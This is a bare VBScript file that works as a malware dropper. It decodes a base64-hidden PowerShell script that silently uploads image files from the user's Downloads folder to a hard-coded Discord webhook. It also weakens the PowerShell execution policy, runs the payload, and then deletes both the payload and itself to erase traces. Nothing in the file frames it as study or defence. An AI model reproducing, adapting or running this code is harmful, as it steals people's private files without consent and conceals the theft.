Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
currentFolder = fso.GetAbsolutePathName(".")
vbsPath = WScript.ScriptFullName
psPath = currentFolder & "\cam.ps1"

' Base64-encoded PowerShell code
base64Code = "IyBTaWxlbnQgQXV0byBVcGxvYWQgSW1hZ2VzIGZyb20gRG93bmxvYWRzIHRvIERpc2NvcmQgKFBvd2VyU2hlbGwgNS4xIGNvbXBhdGlibGUpCgokRG93bmxvYWRzUGF0aCA9ICIkZW52OlVTRVJQUk9GSUxFXERvd25sb2FkcyIKJFdlYmhvb2tVUkwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNjcxNzM3NTQwNjg2NjQ1MC9LTUhRQXkzVUl4NlFlVmxRYV9sekhPc0t0MExjYVBYNFMtTW0tUENPS3RHRjJNTDNyQTBPT2s3a1NIUHZXOHZ5U0h2bSIKJE1heEZpbGVTaXplTUIgPSA4CiRJbWFnZUV4dGVuc2lvbnMgPSBAKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLmdpZiIpCgpmdW5jdGlvbiBVcGxvYWQtRmlsZVRvRGlzY29yZCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kRmlsZVBhdGgsCiAgICAgICAgW3N0cmluZ10kV2ViaG9va1VSTAogICAgKQoKICAgICRCb3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICAkTEYgPSAiYHJgbiIKICAgICRDb250ZW50ID0gIi0tJEJvdW5kYXJ5JExGIgogICAgJENvbnRlbnQgKz0gJ0NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSInICsgW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJEZpbGVQYXRoKSArICciJyArICRMRgogICAgJENvbnRlbnQgKz0gJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyArICRMRiArICRMRgogICAgJEZpbGVCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkRmlsZVBhdGgpCiAgICAkQ29udGVudEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJENvbnRlbnQpCiAgICAkRW5kaW5nQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiJExGLS0kQm91bmRhcnktLSRMRiIpCiAgICAkQWxsQnl0ZXMgPSAkQ29udGVudEJ5dGVzICsgJEZpbGVCeXRlcyArICRFbmRpbmdCeXRlcwoKICAgICRXZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAkV2ViQ2xpZW50LkhlYWRlcnMuQWRkKCJDb250ZW50LVR5cGUiLCAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JEJvdW5kYXJ5IikKICAgIHRyeSB7CiAgICAgICAgJFdlYkNsaWVudC5VcGxvYWREYXRhKCRXZWJob29rVVJMLCAkQWxsQnl0ZXMpIHwgT3V0LU51bGwKICAgIH0KICAgIGNhdGNoIHsgfQp9CgokRmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICREb3dubG9hZHNQYXRoIC1GaWxlIHwgV2hlcmUtT2JqZWN0IHsgJEltYWdlRXh0ZW5zaW9ucyAtY29udGFpbnMgJF8uRXh0ZW5zaW9uLlRvTG93ZXIoKSB9Cgpmb3JlYWNoICgkRmlsZSBpbiAkRmlsZXMpIHsKICAgICRGaWxlU2l6ZU1CID0gW21hdGhdOjpSb3VuZCgkRmlsZS5MZW5ndGggLyAxTUIsIDIpCiAgICBpZiAoJEZpbGVTaXplTUIgLWxlICRNYXhGaWxlU2l6ZU1CKSB7CiAgICAgICAgVXBsb2FkLUZpbGVUb0Rpc2NvcmQgLUZpbGVQYXRoICRGaWxlLkZ1bGxOYW1lIC1XZWJob29rVVJMICRXZWJob29rVVJMCiAgICB9Cn0K"

' Decode Base64 using ADODB.Stream
Set xml = CreateObject("MSXML2.DOMDocument.6.0")
Set node = xml.createElement("base64")
node.dataType = "bin.base64"
node.text = base64Code
binaryData = node.nodeTypedValue

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' adTypeBinary
stream.Open
stream.Write binaryData
stream.Position = 0
stream.Type = 2 ' adTypeText
stream.Charset = "utf-8"
decodedCode = stream.ReadText
stream.Close

' Write decoded code to cam.ps1
Set file = fso.CreateTextFile(psPath, True)
file.WriteLine decodedCode
file.Close

' Set execution policy for current user
WshShell.Run "powershell -NoProfile -Command ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force""", 1, True

' Run cam.ps1 and wait for it to finish
WshShell.Run "powershell -NoProfile -ExecutionPolicy RemoteSigned -File """ & psPath & """", 1, True

' Delete cam.ps1
If fso.FileExists(psPath) Then fso.DeleteFile psPath, True

' Delete this VBS script
If fso.FileExists(vbsPath) Then
    ' Schedule deletion because a script cannot delete itself immediately while running
    WshShell.Run "cmd /c ping 127.0.0.1 -n 2 > nul & del """ & vbsPath & """", 0, False
End If
